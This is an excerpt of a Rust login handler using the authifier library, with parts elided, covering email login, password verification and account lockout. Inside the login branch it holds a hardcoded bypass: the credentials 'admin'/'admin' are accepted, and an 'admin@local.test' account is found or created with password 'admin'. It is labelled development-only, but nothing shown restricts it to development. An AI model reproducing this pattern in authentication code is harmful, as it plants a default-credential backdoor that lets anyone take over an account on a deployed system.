...
use authifier::models::{
    Account, EmailVerification, Lockout, MFAMethod, MFAResponse, MFATicket, Session,
};
...
pub async fn login(
    ...
    let (account, name) = match data.into_inner() {
        DataLogin::Email {
            ...
            // Local development-only fallback to allow bootstrapping without email flows.
            if email == "admin" && password == "admin" {
                let local_email = "admin@local.test".to_string();
                let local_email_normalised = normalise_email(local_email.clone());

                let account = if let Some(account) = authifier
                    .database
                    .find_account_by_normalised_email(&local_email_normalised)
                    .await?
                {
                    account
                } else {
                    Account::new(authifier, local_email, "admin".to_string(), false).await?
                };
                    ...
                    if let Err(err) = account.verify_password(&password) {
                        ...
                        if let Some(lockout) = &mut account.lockout {
                            ...
                            if lockout.attempts >= 3 {
                                lockout.expiry = Some(Timestamp::now_utc().add(
                                    Duration::from_secs(if lockout.attempts >= 5 {
                                        3600
